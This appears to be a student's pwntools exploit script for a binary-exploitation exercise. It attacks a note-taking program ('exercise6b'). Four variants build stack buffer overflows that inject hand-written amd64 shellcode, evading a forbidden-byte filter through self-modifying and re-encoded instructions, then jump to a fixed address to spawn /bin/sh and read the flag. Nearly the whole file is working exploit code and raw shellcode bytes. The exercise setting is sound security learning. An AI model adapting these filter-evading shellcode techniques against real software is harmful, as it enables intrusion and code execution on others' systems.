#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit1():
    r = start()

    forbidden = "05 0D 0F 1E 82 8B 91 95 99 1E A4 A6 A9 CD D2 E6 F6 C8 B8 DA BC C4 CF C3 BF DD CE E0 E9 F3 FF".split(' ')
    # Let's try the encoder
    #shell = asm(shellcraft.amd64.sh())
    #weird = {'\x05', '\r', '\x0f', '\x1e', '\x82', '\x8b', '\x91', '\x95', '\x99', '\x1e', '¤', '¦', '©', 'Í', 'Ò', 'æ', 'ö', 'È', '¸', 'Ú', '¼', 'Ä', 'Ï', 'Ã', '¿', 'Ý', 'Î', 'à', 'é', 'ó', 'ÿ'}
    #new_shell = encoders.i386.delta.encode(shell, weird)
    #print(forbidden_b)
    #print(new_shell) # Does not work ....

    # nops: https://reverseengineering.stackexchange.com/questions/11971/nop-with-argument-in-x86-64
    # 2B: 66 90 -> should work
    nop = 0x9066
    jmp_buf_add = 0x0401616
    #buf_start = 0x07FFFFFFFDCC0
    #buf_end = 0x07FFFFFFFDDB8 # 248 --> 15 stack addresses to jump to
    #read_plt_add = 0x0404070
    #read_plt_sec_add = 0x0401270
    payload = b"A"*32
    # first stage shell
    # read(int fildes, void *buf, size_t nbyte);
    # read(0, )
    # RDI, RSI, RDX, RCX, R8, R9
    fst_stage = """
    xor r12, r12

    mov rsi, r13
    sub rsi, rax
    nop
    lea r8, [ rsi + 0xe ]
    nop
    lea rdi, [ r8 + 1 ]
    lea r8, [ r8 + 0x8 ]
    mov [r8], r12

    lea r12, [ r12 + 4]
    lea r12, [ r12 + 1 ]
    sal r12, 8
    lea r12, [ r12 + 0x0e ]
    lea r12, [ r12 + 1 ]
    lea r8, [ rsi - 3 ]
    mov [r8], r12

    xor r8, r8
    mov rsi, r8
    mov rdx, r8
    xor r12, r12
    lea rax, [ r12 + 59 ]
    """
    #    lea r12, [ rsi + 0 ]
    #sar r12, 16
    #lea r8, [ rsi + 1 ]
    #mov [r8], r12
    # vpcmpeqd ymm0, ymm0, ymm0
    # vmovdqa [r8], ymm0
    #print(asm("syscall"))
    # call read would be E8  14 FE FF FF
    # write to the stack addr of rsi, E8 14 FE FE 5F in the correct place
    # then add rax and nop slide from DCF5 to DD3F into the read
    payload += asm(fst_stage)
    payload += p16(nop)*int((0xDD3F - 0xDCFA)/2-18) # not really nop, but works
    #payload += b'\xE8\x14\xFE\xFE\x5F'
    payload += b"A"*5
    # finish overflow and jump
    payload += b"/bin/sh"*2
    assert len(payload) <= 0x108
    print('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',len(payload))
    payload += cyclic(0x108-len(payload)) + p64(jmp_buf_add)
    print(payload)

    # do forbidden check
    for forb in forbidden:
        if int(forb, 16) in payload:
            raise Exception(f"Char forbidden: {forb}")

    r.sendline(b"1\n")
    r.recvuntil(b"Enter your note:")

    r.sendline(payload)
    # Now read second stage which is just a shell
    #print(r.recvall(timeout=15).decode())
    r.sendline(b"cat flag")
    print(r.recvall(timeout=2).decode())
    #r.interactive()

def exploit2():
    shellcode = b""
    shellcode1 = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73"  # \xb8
    shellcode2 = b"\x68\x00\x99\x50\x54\x5f\x52\x5e" # \x00 \x99  
    shellcode3 = b"\x6a\x3b\x58\x0f\x05"  # \x0f \x05
    #"""

    added_shellcode = b""
    added_shellcode += b"\x49\xb9\x30\x63\x6a\x6f\x30\x74" 
    added_shellcode += b"\x69\x01\x9a\x51\x55\x60\x53\x5f"
    added_shellcode += b"\x6b\x3c\x59\x10\x06"


    badchars = b'\x00\x05\n\r\x0f\x1e\x82\x8b\x91\x95\x99\x1e\xa4\xa6\xa9\xcd\xd2\xe6\xf6\xc8\xb8\xda\xbe\xd6\xc4\xcf\xc3\xce\xd9\xe0\xe9\xf3\xff'
    shellcode = b""
    shellcode +=asm('mov r13, 0x0101010101010101')
    shellcode +=asm('sub [rcx+0x48], r13')
    shellcode +=asm('mov r13, 0x0101010101010101')
    shellcode +=asm('sub [rcx+0x50], r13')
    shellcode +=asm('mov r13, 0x0101010101010101')
    shellcode +=asm('sub [rcx+0x58], r13')



    r = start()
    jmp = 0x0000000000401616


    shellc = b'\x90' * 40  + shellcode +b'\x90'*(14) + added_shellcode + b'\xcc' * (213-40+51 - 14 - len(added_shellcode) -len(shellcode)) + p64(jmp)


    r.recvuntil(b'all notes:\n')
    r.sendline(b'1')
    r.recvuntil(b'your note:\n')

    r.sendline(shellc)
    r.sendline(b"cat flag")
    r.sendline(b"exit")
    print(r.recvall().decode(errors='ignore'))
    
def exploit3():
    ADD_NOTE = b"1"
    SHOW_NOTES = b"2"
    PADDING = 26

    r = start()

    r.sendline(ADD_NOTE)
    r.recvline()

    note = b"x" * PADDING + b"\x90" * 2
    note += asm("xor r12, r12\nmov rsi, r13\nsub rsi, rax", arch = 'amd64')
    note += asm("lea r8, [rsi + 0xE]", arch = 'amd64')
    note += asm("lea rdi, [r8 + 0x1]\nlea r8, [r8 + 0x8]\nmov [r8], r12\nlea r12, [r12 + 0x4]\nlea r12, [r12 + 0x1]\nsal r12, 0x8", arch = 'amd64')
    note += asm("lea r12, [r12 + 0xE]\nlea r12, [r12 + 0x1]\nlea r8, [rsi - 0x3]\nmov [r8], r12", arch = 'amd64')
    note += asm("xor r8, r8\nmov rsi, r8\nmov rdx, r8\nxor r12, r12\nlea rax, [r12 + 0x3B]", arch = 'amd64')
    note += 16 * (36966).to_bytes(length=2, byteorder='little')
    note += b"y" * 5
    note += b"/bin/sh"
    note += b"z" * PADDING * 4 
    note += (4199958).to_bytes(length=8, byteorder='little')
    note += b"\ncat flag"

    r.sendline(note)

    flag_output = r.recvall(timeout=1)
    print(flag_output.decode(errors='ignore'))
    
def expoloit4():
    r = start()
    jmp = 0x401616
    payload = b'A'*32 # buffer size
    #print(len(asm("nop")))
    #
    payload_ = asm("mov rsi, r13")#
    payload_ += asm("sub rsi, rax")#
    payload_ += asm("xor r12, r12")#
    payload_ += asm("lea r8, [rsi+0xe]")#
    payload_ += asm("lea rdi, [r8+1]")#
    payload_ += asm("lea r8, [r8+0x8]")#
    payload_ += asm("mov [r8], r12")#
    payload_ += asm("lea r12, [r12+4]")#
    payload_ += asm("lea r12, [r12+4]")#no
    payload_ += asm("sal r12, 8")#
    payload_ += asm("lea r12, [r12+0x0e]")#
    payload_ += asm("lea r12, [r12+1]")#
    payload_ += asm("lea r8, [rsi-3]")#
    payload_ += asm("mov [r8], r12")#
    payload_ += asm("xor r8, r8")#
    payload_ += asm("mov rsi, r8")#
    payload_ += asm("mov rdx, r8")#
    payload_ += asm("xor r12, r12")#
    payload_ += asm("lea rax, [r12+59]")#

    print(payload_)

    payload += payload_

    payload += b'\x90'*39 + b"/bin/sh"
    payload += b'\x90' * (264-len(payload)) + p64(jmp)

    r.sendline(b'1')
    r.recvuntil(b" note:")
    r.sendline(payload )
    r.sendline(b"cat flag")
    r.interactive()

note = asm("xor r12, r12\nmov rsi, r13\nsub rsi, rax", arch = 'amd64')
note += asm("lea r8, [rsi + 0xE]", arch = 'amd64')
note += asm("lea rdi, [r8 + 0x1]\nlea r8, [r8 + 0x8]\nmov [r8], r12\nlea r12, [r12 + 0x4]\nlea r12, [r12 + 0x1]\nsal r12, 0x8", arch = 'amd64')
note += asm("lea r12, [r12 + 0xE]\nlea r12, [r12 + 0x1]\nlea r8, [rsi - 0x3]\nmov [r8], r12", arch = 'amd64')
note += asm("xor r8, r8\nmov rsi, r8\nmov rdx, r8\nxor r12, r12\nlea rax, [r12 + 0x3B]", arch = 'amd64')
#print((4199958).to_bytes(length=8, byteorder='little'))
code = '''
add BYTE PTR [ rcx + 0x47 ], 0x2
add BYTE PTR [ rcx + 0x44 ], 0x2
add BYTE PTR [ rcx + 0x41 ], 0x2
add BYTE PTR [ rcx + 0x48 ], 0x2
add BYTE PTR [ rcx + 0x49 ], 0x2
add BYTE PTR [ rcx + 0x4a ], 0x2
'''


print(len(asm(code)))
